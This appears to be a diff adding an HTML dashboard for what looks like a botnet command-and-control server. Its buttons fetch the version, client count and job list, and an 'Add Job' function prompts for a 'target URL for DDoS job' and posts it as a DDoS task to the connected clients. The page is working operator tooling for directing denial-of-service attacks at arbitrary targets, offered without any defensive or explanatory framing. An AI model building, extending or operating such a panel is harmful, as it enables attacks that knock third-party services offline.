@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+
+        h1 {
+            text-align: center;
+        }
+
+        button {
+            padding: 10px;
+            margin: 10px;
+            cursor: pointer;
+        }
+
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        li {
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Dashboard</h1>
+
+<button onclick="getVersion()">Get Version</button>
+<p id="version"></p>
+
+<button onclick="pingServer()">Ping Server</button>
+<p id="pingStatus"></p>
+
+<button onclick="getJob()">Get Job</button>
+<p id="jobStatus"></p>
+
+<button onclick="addJob()">Add Job</button>
+<p id="addJobStatus"></p>
+
+<button onclick="getClientsCount()">Get Clients Count</button>
+<p id="clientsCount"></p>
+
+<button onclick="getJobsList()">Get Jobs List</button>
+<ul id="jobsList"></ul>
+
+<script>
+    function getVersion() {
+        fetch("/get_version/")
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("version").innerText = "Version: " + data.version;
+            });
+    }
+
+    function pingServer() {
+        fetch("/ping/")
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("pingStatus").innerText = "Ping Status: " + data.status;
+                if (data.prioritize) {
+                    alert("Priority task available!");
+                }
+            });
+    }
+
+    function getJob() {
+        fetch("/get_job/")
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("jobStatus").innerText = "Job Status: " + data.status;
+                if (data.status === "ok") {
+                    alert("Job received: " + JSON.stringify(data));
+                }
+            });
+    }
+
+    function addJob() {
+        var targetUrl = prompt("Enter target URL for DDoS job:");
+        if (targetUrl) {
+            fetch("/add_job/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ job_type: "DDoS", target_url: targetUrl })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("addJobStatus").innerText = "Add Job Status: " + data.status;
+                });
+        }
+    }
+
+    function getClientsCount() {
+        fetch("/get_clients_count/")
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("clientsCount").innerText = "Clients Count: " + data.clients_count;
+            });
+    }
+
+    function getJobsList() {
+        fetch("/get_jobs_list/")
+            .then(response => response.json())
+            .then(data => {
+                const jobsList = document.getElementById("jobsList");
+                jobsList.innerHTML = "Jobs List:";
+                data.jobs.forEach(job => {
+                    const listItem = document.createElement("li");
+                    listItem.textContent = JSON.stringify(job);
+                    jobsList.appendChild(listItem);
+                });
+            });
+    }
+</script>
+
+</body>
+</html>
